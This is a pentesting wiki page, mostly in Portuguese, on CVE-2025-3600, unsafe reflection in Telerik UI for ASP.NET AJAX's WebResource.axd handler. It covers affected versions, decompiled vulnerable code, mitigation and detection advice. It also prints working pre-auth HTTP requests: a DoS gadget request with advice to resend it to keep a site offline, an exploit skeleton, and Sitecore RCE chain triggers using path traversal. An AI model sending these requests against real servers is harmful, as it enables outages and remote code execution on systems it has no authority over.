# Telerik UI for ASP.NET AJAX – Unsafe Reflection via WebResource.axd (type=iec)

{{#include ../../banners/hacktricks-training.md}}

> Execução de construtor pre‑auth no Image Editor cache handler do Telerik UI for ASP.NET AJAX permite DoS universal e, em muitas aplicações, RCE pre‑auth via gadgets específicos do alvo (CVE-2025-3600).

## Resumo

- Componente/rota afetada: Telerik.Web.UI.WebResource.axd com a query type=iec (Image Editor cache handler). Exposta pre‑auth em muitos produtos.
- Primitive: O atacante controla um nome de tipo (prtype). O handler o resolve com Type.GetType() e invoca Activator.CreateInstance() antes de verificar a segurança de tipo da interface. Qualquer construtor público sem parâmetros de um tipo .NET será executado.
- Impacto:
- DoS universal pre‑auth usando um gadget do .NET framework (PowerShell WSMan finalizer).
- Frequentemente eleva para RCE pre‑auth em implantações reais ao abusar de gadgets específicos da aplicação, especialmente handlers inseguros AppDomain.AssemblyResolve.
- Correção: Atualizar para Telerik UI for ASP.NET AJAX 2025.1.416+ ou remover/bloquear o handler.

## Versões afetadas

- Telerik UI for ASP.NET AJAX versões 2011.2.712 até 2025.1.218 (inclusivas) são vulneráveis.
- Corrigido em 2025.1.416 (lançado em 2025-04-30). Aplique o patch imediatamente ou remova/bloqueie o handler.

## Superfície afetada e descoberta rápida

- Verificar exposição:
- GET /Telerik.Web.UI.WebResource.axd deve retornar algo diferente de 404/403 se o handler estiver conectado.
- Inspecionar web.config por handlers mapeando para Telerik.Web.UI.WebResource.axd.
- O caminho para acionar o código vulnerável requer: type=iec, dkey=1, e prtype=<AssemblyQualifiedType>.

Example probe and generic trigger:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly
```
Notas
- Alguns PoCs usam dtype; a implementação verifica dkey=="1" para o fluxo de download.
- prtype deve ser assembly-qualified ou resolvable no AppDomain atual.

## Root cause – unsafe reflection in ImageEditorCacheHandler

O fluxo de download do cache do Image Editor constrói uma instância de um tipo fornecido em prtype e somente depois a converte para ICacheImageProvider e valida a chave de download. O construtor já foi executado quando a validação falha.

<details>
<summary>Fluxo decompilado relevante</summary>
```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
string text = context.Request["dkey"];           // dkey
string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
...
if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
{
ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
string key = context.Request["key"];
if (text == "1" && !this.IsValidDownloadKey(text2))
{
this.CompleteAsBadRequest(context.ApplicationInstance);
return; // cast/check happens after ctor has already run
}
using (EditableImage editableImage = imageProvider.Retrieve(key))
{
this.SendImage(editableImage, context, text, fileName);
}
}
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
if (!string.IsNullOrEmpty(context.Request["prtype"]))
{
return RadImageEditor.InitCacheImageProvider(
RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
);
}
...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
// unsafe: construct before enforcing interface type-safety
return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```
</details>

Exploit primitive: string de tipo controlada → Type.GetType a resolve → Activator.CreateInstance executa seu construtor público sem parâmetros. Mesmo se a requisição for rejeitada depois, os efeitos colaterais do gadget já ocorreram.

## Universal DoS gadget (nenhum gadget específico do aplicativo necessário)

Class: System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper in System.Management.Automation (PowerShell) tem um finalizador que chama Dispose em um handle não inicializado, causando uma exceção não tratada quando o GC finaliza o objeto. Isso derruba de forma confiável o processo worker do IIS pouco depois da instanciação.

Requisição DoS de uso único:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
Notas
- Continue enviando periodicamente para manter o site offline. Você pode observar o construtor sendo atingido em um debugger; o crash ocorre na finalização.

## From DoS to RCE – padrões de escalonamento

A execução insegura de construtores desbloqueia muitos gadgets e cadeias específicas do alvo. Procure por:

1) Construtores sem parâmetros que processam entrada do atacante
- Alguns ctors (ou inicializadores estáticos) leem imediatamente Request query/body/cookies/headers e (de)serializam os dados.
- Exemplo (Sitecore): uma cadeia de ctors alcança GetLayoutDefinition() que lê o HTTP body "layout" e desserializa JSON via JSON.NET.

2) Construtores que manipulam arquivos
- Ctros que carregam ou desserializam config/blobs do disco podem ser coagidos se você puder escrever nesses caminhos (pastas uploads/temp/data).

3) Construtores que realizam ops específicas do app
- Resetar estado, alternar módulos ou encerrar processos.

4) Construtores/static ctors que registram AppDomain event handlers
- Muitos apps adicionam AppDomain.CurrentDomain.AssemblyResolve handlers que constroem caminhos de DLL a partir de args.Name sem sanitização. Se você puder influenciar a resolução de tipos, pode forçar loads arbitrários de DLLs a partir de paths controlados pelo atacante.

5) Forçar AssemblyResolve via Type.GetType
- Solicite um tipo inexistente para forçar a resolução do CLR e invocar resolvers registrados (possivelmente inseguros). Exemplo de assembly-qualified name:
```
This.Class.Does.Not.Exist, watchTowr
```
6) Finalizadores com efeitos colaterais destrutivos
- Alguns tipos deletam arquivos com caminho fixo em finalizadores. Combinado com link-following ou caminhos previsíveis isso pode permitir local privilege escalation em certos ambientes.

## Exemplo de pre‑auth RCE chain (Sitecore XP)

- Passo 1 – Pre‑auth: Acione um tipo cujo static/instance ctor registra um insecure AssemblyResolve handler (e.g., Sitecore’s FolderControlSource in ControlFactory).
- Passo 2 – Post‑auth: Obtenha permissão de escrita em um resolver-probed directory (e.g., via an auth bypass or weak upload) e plante uma DLL maliciosa.
- Passo 3 – Pre‑auth: Use CVE‑2025‑3600 com um tipo inexistente e um traversal‑laden assembly name para forçar o resolver a carregar sua DLL plantada → code execution como o IIS worker.

Exemplos de gatilhos
```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```
## Validação, hunting e notas de DFIR

- Validação segura em laboratório: Dispare o payload DoS e observe por app pool recycle/exceção não tratada ligada ao finalizer WSMan.
- Hunt em telemetria:
- Requisições para /Telerik.Web.UI.WebResource.axd com type=iec e valores prtype estranhos.
- Falhas em carregamentos de type e eventos AppDomain.AssemblyResolve.
- Quedas/crashes e recycles súbitos do w3wp.exe após tais requisições.

## Mitigation

- Atualize para Telerik UI for ASP.NET AJAX 2025.1.416 ou posterior.
- Remova ou restrinja a exposição de Telerik.Web.UI.WebResource.axd quando possível (WAF/rewrites).
- Ignorar ou endurecer o tratamento de prtype no lado do servidor (a atualização aplica verificações adequadas antes da instanciação).
- Audite e endureça manipuladores customizados de AppDomain.AssemblyResolve. Evite construir caminhos a partir de args.Name sem sanitização; prefira strong-named loads ou whitelists.
- Constrinja locais de upload/write e previna drops de DLL em diretórios sondados.
- Monitore tentativas de type load inexistente para detectar abuso do resolver.

## Cheat‑sheet

- Presence check:
- GET /Telerik.Web.UI.WebResource.axd
- Procure por handler mapping em web.config
- Exploit skeleton:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=<TypeName,+Assembly,+Version=..., +PublicKeyToken=...>
```
- DoS Universal:
```http
...&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
- Resolver do gatilho:
```
This.Class.Does.Not.Exist, watchTowr
```
## Técnicas relacionadas

- IIS post-exploitation, .NET key extraction, e in‑memory loaders:

{{#ref}}
iis-internet-information-services.md
{{#endref}}

- ASP.NET ViewState deserialization e machineKey abuses:

{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

## Referências

- [watchTowr labs – More than DoS: Progress Telerik UI for ASP.NET AJAX Unsafe Reflection (CVE-2025-3600)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace (Mirosh & Muñoz) – DoS gadget background](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes to escalate privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Is “B” for Backdoor? (Sitecore chain CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

{{#include ../../banners/hacktricks-training.md}}
